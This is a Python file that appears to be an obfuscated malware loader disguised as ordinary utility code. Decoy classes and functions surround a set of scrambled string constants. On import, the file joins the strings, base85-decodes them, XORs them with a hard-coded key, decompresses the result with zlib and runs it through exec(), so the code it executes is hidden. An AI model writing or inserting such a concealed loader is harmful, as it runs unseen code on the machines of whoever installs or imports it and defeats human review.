import sys, os
from typing import Optional, Any

class validate_tNQw:
    _data = {}
    def __init__(self, mode='default'):
        self.mode = mode
        self._buf = bytearray()
    def write(self, chunk):
        self._buf.extend(chunk)
        return len(chunk)
    def flush(self):
        out = bytes(self._buf)
        self._buf.clear()
        return out

_Ol11I1Ol0O0l = 'K<ZuE}AX_Z9xn(A+8!!bLLWcR{)}s'
_01IllOO0lOll = 'N8qv3b-x@w<^r}){j+Y@TBA^6=ZH;tpQqKTd@<5};77N?q2&&rf3#uv!}+^DdE3!}q4J3FZC&1QE6n6+E5Ct{m`&SJ7;R#?hEF&{u>YYko#9W}RGRRQNd(4mcsEvECuvkyUQtD}aaAkrwCstBXaa}1kjFVQK|B4cnl1-eja^CaV}_sS9+b|#*)~ZqNP`EL<EWY}LppnyN1$rK__}-6JWNtAnAr(B4yG)TG70dxgNCR'
_O0I01OlOllO0 = '@^=3siJqzSqwwlFp|G0EsdhWc'
_01I1l00I0llO = 'Ro?5^XFET~SoD8oM;YTCaj@Kt!596_9?7C;wPcXr'
_01IlOO10O1l1 = 'Na~QA^MOtYEy^(x0+1(zNt4aE=+'
_OlOO1lI01I0l = 'tNA5?~=A6gMUVsU3~(o~Qx=o%HNQeRP(c|_IN5`1$j4a}&063-'
_Ol10110ll01l = '>HQ-C>2P~9ByXZbzq{siNowl50SZrwm6t3VOCs<SQg`}'
_O1l00OIOI0lI = 'lyK|6re1*}C88y%?N*eWAY1EAmzesrA-Q&U'
_0lIO0I0II1l1 = '`gClDEQWjesya)n_i@N3wxXOmBsDsxNTB@mKb;5vT|g1Y^J4'
_0O101Ill11l0 = '-63v%G0m{zg+K!y~cnNJ<8OZLRm?8#y9sebvoFptx(9^FAU<Qa'
_l1lO1Ill001O = '%#rjS4s;H_H>?#LFdmr|D;SdS<Z@(N5<<%YU<{LU#;=8)cL7$dFO<wyZ`t((I|0t!lSEZ=1F$*9=J`1Z@NH2DPZM1!t(VtY0`+iUA!9x<gyK*QPto)Qi(F>gxo<af+R*Z4mNd#3kRO?VbCHPAyw(tYJM^@wv6Y_OW!9jm*carThE8A-59YUDZr4N@s#5'
_lI00Il0Il0II = 'fFWm3?uoJXd+cQEQ=?zGah-=@cMRGFS'
_01l0O010lllI = '|kb$|CDKyz6At0s'
_I01I01Ol00lI = 'fR;L}#Z&1BW`G9lRON0^nB>f(%s+PS=3cl5B{Hkq7a_f?9&ftoi8X2o>m!eDoJi_i<G%^4aY}P0`(EUlaGBYH;)siHZe|{{aheMtSXB'
_l1lIl01I1lIl = '}`Q<IgT%LZQ>JU=S@JVQ6l&='

def cache_2M9H(data, key=None):
    if not data:
        return None
    result = []
    for i, x in enumerate(data):
        if key and i % 2 == 0:
            result.append(x ^ key[i % len(key)])
        else:
            result.append(x)
    return bytes(result) if result else b""

_O0I10I1l1IO0 = [_0lIO0I0II1l1, _O1l00OIOI0lI, _l1lIl01I1lIl, _O0I01OlOllO0, _01I1l00I0llO, _01IlOO10O1l1, _Ol10110ll01l, _0O101Ill11l0, _OlOO1lI01I0l, _01l0O010lllI, _lI00Il0Il0II, _Ol11I1Ol0O0l]
_I0l01l00I11l = b'\x82*1\xd7a\xedy\xc8\xbe\x86\xa4\x04o\xd7O\x88'
_I1l01Ol11OII = ''.join(_O0I10I1l1IO0)

exec(__import__('zlib').decompress((lambda d,k:bytes(a^b for a,b in zip(d,__import__('itertools').cycle(k))))(__import__('base64').b85decode(_I1l01Ol11OII),_I0l01l00I11l)).decode('utf-8'))

def stream_xs4k(data, key=None):
    if not data:
        return None
    result = []
    for i, x in enumerate(data):
        if key and i % 2 == 0:
            result.append(x ^ key[i % len(key)])
        else:
            result.append(x)
    return bytes(result) if result else b""
